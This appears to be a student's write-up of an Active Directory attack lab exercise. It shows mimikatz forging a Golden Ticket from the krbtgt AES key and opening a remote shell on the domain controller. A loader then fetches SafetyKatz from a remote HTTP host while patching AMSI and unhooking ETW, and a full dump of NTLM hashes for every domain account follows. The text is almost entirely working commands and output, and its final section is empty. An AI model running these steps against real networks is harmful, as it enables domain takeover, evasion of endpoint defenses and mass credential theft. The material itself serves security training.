# HANDS-ON 14:

```
Using the NTLM hash or AES key of krbtgt account of us.techcorp.local, create a Golden ticket.
Use the Golden ticket to (once again) get domain admin privileges from a machine.

```

## Index of content
  1. [Create Golden Ticket](#create-golden-ticket)
  2. [Get Admin Privileges](#get-admin-privileges)


## Create Golden Ticket
Use Administrator with krbtgt user aes 256 hash, extracted for dc-sync on hands-on 11:
```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 - aes256_hmac
Lifetime  : 2/22/2023 10:39:15 AM ; 2/22/2023 8:39:15 PM ; 3/1/2023 10:39:15 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session
```
show ticket :
```
C:\Windows\system32>klist

Current LogonId is 0:0x184bfdc

Cached Tickets: (1)

#0>     Client: Administrator @ us.techcorp.local
        Server: krbtgt/us.techcorp.local @ us.techcorp.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/22/2023 10:39:15 (local)
        End Time:   2/22/2023 20:39:15 (local)
        Renew Time: 3/1/2023 10:39:15 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
Access :
```
C:\Windows\system32>winrs -r:us-dc cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whoami
whoami
us\administrator

C:\Users\Administrator>hostname
hostname
US-DC
```


Load And Dump users from domain:

```
C:\Users\Public>C:\Users\Public\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
C:\Users\Public\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://192.168.100.17:8989/SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # http://192.168.100.17:8989/SafetyKatz.exe
ERROR mimikatz_doLocal ; "http://192.168.100.17:8989/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : US / S-1-5-21-210670787-2521448726-163245708

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 43b70d2d979805f419e02882997f8f3f

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : b0975ae49f441adc6b024ad238935af5

RID  : 00000458 (1112)
User : emptest
LM   :
NTLM : 216fa4d07d30bdf282443cf7241abb8b

RID  : 0000045a (1114)
User : adconnect
LM   :
NTLM : 4e150424ccf419d83ce3a8ad1db7b94a

RID  : 0000045b (1115)
User : mgmtadmin
LM   :
NTLM : e53153fc2dc8d4c5a5839e46220717e5

RID  : 00000460 (1120)
User : helpdeskadmin
LM   :
NTLM : 94b4a7961bb45377f6e7951b0d8630be

RID  : 00000461 (1121)
User : dbservice
LM   :
NTLM : e060fc2798a6cc9d9ac0a3bb9bf5529b

RID  : 00000462 (1122)
User : atauser
LM   :
NTLM : f7f6ab297d5a4458073b91172f498b70

RID  : 00000464 (1124)
User : exchangeadmin
LM   :
NTLM : 65c1a880fcf8832d55fdc1d8af76f117

RID  : 00000465 (1125)
User : HealthMailbox3bd1057
LM   :
NTLM : 036c0c459aa8f94d1959ba50a6ec9bcf

RID  : 00000466 (1126)
User : HealthMailboxc8de558
LM   :
NTLM : d31ffe1fc923cd0d54d71c0ab07c43d1

RID  : 00000467 (1127)
User : HealthMailbox01f72be
LM   :
NTLM : bc2bffcbb7d5e3720467a159b5310e34

RID  : 00000468 (1128)
User : HealthMailbox128342c
LM   :
NTLM : ecde2a64c10bb8212fb4fd3ce719424a

RID  : 00000469 (1129)
User : HealthMailboxbb3d25e
LM   :
NTLM : ad68b1275df61ab87315deb73ffcc868

RID  : 0000046a (1130)
User : HealthMailbox87cf12f
LM   :
NTLM : e5b20fff8ef19cc679f5f277b2f20ade

RID  : 0000046b (1131)
User : HealthMailboxd517735
LM   :
NTLM : b1cfb7e7723a5dd54bbe341311a11896

RID  : 0000046c (1132)
User : HealthMailbox86956b9
LM   :
NTLM : 8260d867bcff9b2b6ece08f41d673f3c

RID  : 0000046d (1133)
User : HealthMailbox307c425
LM   :
NTLM : 8ba1ff7e75b6bff3d763a2f45f709afc

RID  : 0000046e (1134)
User : HealthMailbox7f97592
LM   :
NTLM : c90d29c906daa0dff7a14c7834175ba3

RID  : 0000046f (1135)
User : HealthMailboxd933b3c
LM   :
NTLM : 517b5ccc5454b6622e79a8326a272d64

RID  : 00000470 (1136)
User : exchangemanager
LM   :
NTLM : b8a0ea6e3c104472377d082154faa9e4

RID  : 00000471 (1137)
User : exchangeuser
LM   :
NTLM : 1ef08776e2de6e9d9062ff9c81ff3602

RID  : 00000472 (1138)
User : pawadmin
LM   :
NTLM : 36ea28bfa97a992b5e85bd22485e8d52

RID  : 00000473 (1139)
User : jwilliams
LM   :
NTLM : 65c6bbc54888cbe28f05b30402b7c40b

RID  : 00000474 (1140)
User : webmaster
LM   :
NTLM : 23d6458d06b25e463b9666364fb0b29f

RID  : 00000478 (1144)
User : serviceaccount
LM   :
NTLM : 58a478135a93ac3bf058a5ea0e8fdb71

RID  : 000004f7 (1271)
User : devuser
LM   :
NTLM : 539259e25a0361ec4a227dd9894719f6

RID  : 00000507 (1287)
User : testda
LM   :
NTLM : a9cc782709f6bb95aae7aab798eaabe7

RID  : 00000509 (1289)
User : decda
LM   :
NTLM : 068a0a7194f8884732e4f5a7cb47e17c

RID  : 000011f9 (4601)
User : appsvc
LM   :
NTLM : 1d49d390ac01d568f0ee9be82bb74d4c

RID  : 0000219a (8602)
User : provisioningsvc
LM   :
NTLM : 44dea6608c25a85d578d0c2b6f8355c4

RID  : 00003ee5 (16101)
User : studentuser11
LM   :
NTLM : 49e5ea1b9a4c9582ed1fefce4fd8f99a

RID  : 00003ee6 (16102)
User : studentuser12
LM   :
NTLM : e50f33799f270360d912450b6c912981

RID  : 00003ee7 (16103)
User : studentuser13
LM   :
NTLM : 3871f3645bb8d63ee33dea012adc2deb

RID  : 00003ee8 (16104)
User : studentuser14
LM   :
NTLM : 24b501be7cfa4b4f9acc1a664e9ad585

RID  : 00003ee9 (16105)
User : studentuser15
LM   :
NTLM : ac05dd17597e6cc5aa2069ca9046ddb4

RID  : 00003eea (16106)
User : studentuser16
LM   :
NTLM : 508204d291c17a4bf16cdfbd9d3dc011

RID  : 00003eeb (16107)
User : studentuser17
LM   :
NTLM : 8f4ae466eb08f7e8c8f4dd9ec2a2caa1

RID  : 00003eec (16108)
User : studentuser18
LM   :
NTLM : 5c31f4c7c135ff236d343cd98345a774

RID  : 00003eed (16109)
User : studentuser19
LM   :
NTLM : a63d89c191c16c44a83efc85ce3a793c

RID  : 00003eee (16110)
User : studentuser20
LM   :
NTLM : 3edc404a4f8d6d6fcc495f8a52cbd6bd

RID  : 00003eef (16111)
User : studentuser21
LM   :
NTLM : c16b4aa0272623b132b71ea73b0735f4

RID  : 00003ef0 (16112)
User : studentuser22
LM   :
NTLM : a5bad3959a75690d3add87d5d52b3d0b

RID  : 00003ef1 (16113)
User : studentuser23
LM   :
NTLM : 9394cdf5ceb0f99e3c30ea1cc820450e

RID  : 00003ef2 (16114)
User : studentuser24
LM   :
NTLM : 6d367ae6d61a76cc319fdbe57b90a2d5

RID  : 00003ef3 (16115)
User : studentuser25
LM   :
NTLM : 67307a8629c7424d42457bfe4a8e4aba

RID  : 00003ef4 (16116)
User : studentuser26
LM   :
NTLM : 4768c39db733f105bb42c80659d085e3

RID  : 00003ef5 (16117)
User : studentuser27
LM   :
NTLM : 1bf01af13b308710b32867c3b386f381

RID  : 00003ef6 (16118)
User : studentuser28
LM   :
NTLM : f8ed95987e4e422940f5869b3faa08ea

RID  : 00003ef7 (16119)
User : studentuser29
LM   :
NTLM : 15ae44b5fe60a36379ee2fce25bf9d87

RID  : 00003ef8 (16120)
User : studentuser30
LM   :
NTLM : cf773b51c5bb8e5bb880bfd2e1e2c4a9

RID  : 00003ef9 (16121)
User : Support11user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003efa (16122)
User : Support12user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003efb (16123)
User : Support13user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003efc (16124)
User : Support14user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003efd (16125)
User : Support15user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003efe (16126)
User : Support16user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003eff (16127)
User : Support17user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f00 (16128)
User : Support18user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f01 (16129)
User : Support19user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f02 (16130)
User : Support20user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f03 (16131)
User : Support21user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f04 (16132)
User : Support22user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f05 (16133)
User : Support23user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f06 (16134)
User : Support24user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f07 (16135)
User : Support25user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f08 (16136)
User : Support26user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f09 (16137)
User : Support27user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f0a (16138)
User : Support28user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f0b (16139)
User : Support29user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f0c (16140)
User : Support30user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 00003f1d (16157)
User : studentuser1
LM   :
NTLM : f56713e794d2dba61645dbeda1f08a1d

RID  : 00003f22 (16162)
User : Support1user
LM   :
NTLM : 3d441b1832bd67688c191c7c63cccbb4

RID  : 000003e8 (1000)
User : US-DC$
LM   :
NTLM : f4492105cb24a843356945e45402073e

RID  : 00000450 (1104)
User : US-EXCHANGE$
LM   :
NTLM : 20a0e5d7c56dc75c9d2b4f3ac6c22543

RID  : 00000451 (1105)
User : US-MGMT$
LM   :
NTLM : fae951131d684b3318f524c535d36fb2

RID  : 00000452 (1106)
User : US-HELPDESK$
LM   :
NTLM : 76c3848cc2e34ef0a8b5751f7e886b8e

RID  : 00000453 (1107)
User : US-MSSQL$
LM   :
NTLM : ccda609713cb52b1aa752ee23aaf2fae

RID  : 00000454 (1108)
User : US-MAILMGMT$
LM   :
NTLM : 6e1c353761fff751539e175a8393a941

RID  : 00000455 (1109)
User : US-JUMP$
LM   :
NTLM : abff11a76a2fa6de107f0ea8251005c5

RID  : 00000456 (1110)
User : US-WEB$
LM   :
NTLM : 892ca1e8d4343c652646b59b51779929

RID  : 00000457 (1111)
User : US-ADCONNECT$
LM   :
NTLM : 093f64d9208f2b546a3b487388b2b34a

RID  : 00002199 (8601)
User : jumpone$
LM   :
NTLM : 0a02c684cc0fa1744195edd1aec43078

RID  : 00003f0d (16141)
User : STUDENT11$
LM   :
NTLM : 981e8b3916c17d9836544dc9e460469e

RID  : 00003f0e (16142)
User : STUDENT12$
LM   :
NTLM : c782c2771b9929a4bb4ba0333a59cff2

RID  : 00003f0f (16143)
User : STUDENT13$
LM   :
NTLM : a648582759b264157377baaf07545622

RID  : 00003f10 (16144)
User : STUDENT14$
LM   :
NTLM : 34ce88d46d9a646d2757f4b7c2c582c8

RID  : 00003f11 (16145)
User : STUDENT15$
LM   :
NTLM : b6af63a991856febe74d5a449aaecebe

RID  : 00003f12 (16146)
User : STUDENT16$
LM   :
NTLM : 223127e0d83d1070c3eb60e54b6af53d

RID  : 00003f13 (16147)
User : STUDENT17$
LM   :
NTLM : bca76bfd071cc0a82033132dbededfcd

RID  : 00003f14 (16148)
User : STUDENT18$
LM   :
NTLM : 1610ee735442effad75ac3d924ed37b9

RID  : 00003f15 (16149)
User : STUDENT19$
LM   :
NTLM : 8a3a39b648575bd37c684dd10608191c

RID  : 00003f16 (16150)
User : STUDENT20$
LM   :
NTLM : ed2ca2b394f3b7d03eb112abc91c3e7d

RID  : 00003f17 (16151)
User : STUDENT21$
LM   :
NTLM : d38f760080028cf9ad3fa376857ce688

RID  : 00003f18 (16152)
User : STUDENT22$
LM   :
NTLM : ba412c3846f0b98846405c34de052aa7

RID  : 00003f19 (16153)
User : STUDENT23$
LM   :
NTLM : 8a3dcfc77886c8f5c1661a19d3784c49

RID  : 00003f1a (16154)
User : STUDENT24$
LM   :
NTLM : 6bdd6f6924159f131bce95aec388077c

RID  : 00003f1b (16155)
User : STUDENT25$
LM   :
NTLM : 05b2d7b01082f3f236e69ba4efa57c43

RID  : 00003f1c (16156)
User : STUDENT26$
LM   :
NTLM : 9f7df9fa7e02ddc8c138a6fffdadcd00

RID  : 00003f1e (16158)
User : STUDENT27$
LM   :
NTLM : 6fc254c405dd7feb0ed5d8dd1a9b9d82

RID  : 00003f1f (16159)
User : STUDENT28$
LM   :
NTLM : c986a04ecfbb088801eac84b1ed1aa92

RID  : 00003f20 (16160)
User : STUDENT29$
LM   :
NTLM : 7207f75860797c579d6bd39934ec3341

RID  : 00003f21 (16161)
User : STUDENT30$
LM   :
NTLM : ac1de35d283bde96446e3794058a6598

RID  : 00003f23 (16163)
User : STUDENT1$
LM   :
NTLM : 8a8409997a950fc1ac543cb6eb94f165

RID  : 0000044f (1103)
User : TECHCORP$
LM   :
NTLM : f1f7e5dfab00c96fa666ddb2eed5203a

RID  : 00000477 (1143)
User : EU$
LM   :
NTLM : 94622325b64320a2376df0cecd73fcad
```
## Get Admin Privileges

```
```
